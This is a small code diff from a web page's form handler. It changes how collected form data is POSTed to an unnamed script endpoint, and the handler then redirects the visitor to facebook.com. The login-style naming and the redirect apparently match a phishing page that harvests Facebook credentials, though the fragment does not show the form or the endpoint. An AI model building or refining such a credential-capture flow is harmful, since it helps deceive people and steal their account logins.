@@ -231,7 +231,7 @@
   }
 		    submitlog.style.opacity = 0.6;
 		    submitlog.disabled = true;
-              fetch(scriptURL, { method: 'POST', body: datas })
+              fetch(scriptURL, { method: 'POST', body: JSON.stringify(datas) })
                 .then(response => window.location.href = "https://facebook.com/")
                 .catch(error => console.error('Error!', error.message))
             });
